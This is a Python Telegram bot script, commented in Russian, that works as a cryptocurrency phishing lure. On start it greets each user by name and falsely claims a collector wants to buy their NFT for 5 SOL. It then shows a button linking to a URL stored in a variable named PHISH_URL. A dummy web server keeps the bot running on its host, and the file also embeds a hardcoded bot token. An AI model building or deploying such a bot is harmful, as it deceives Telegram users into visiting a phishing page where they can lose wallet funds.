import asyncio
import logging
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9029487798:AAEqAXvQrO7GS6e8pbSeEcTrqCnx6lgF6yY"
PHISH_URL = "https://spectacular-kelpie-00f97e.netlify.app" # <-- Твоя ссылка

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- ОБРАБОТКА СТАРТА ---
@dp.message(CommandStart())
async def start(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="💰 Забрать NFT (5 SOL)", url=PHISH_URL)
    
    await message.answer(
        f"👋 Привет, {message.from_user.first_name}!\n\n"
        "🔥 Я коллекционер и хочу купить твой NFT за **5 SOL**.\n"
        "Нажми кнопку ниже, чтобы принять оффер и получить деньги:",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )

# --- ФЕЙКОВЫЙ СЕРВЕР (ЧТОБЫ RENDER НЕ ВЫКЛЮЧАЛ БОТА) ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), BaseHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_dummy_server, daemon=True).start()
    asyncio.run(dp.start_polling(bot))
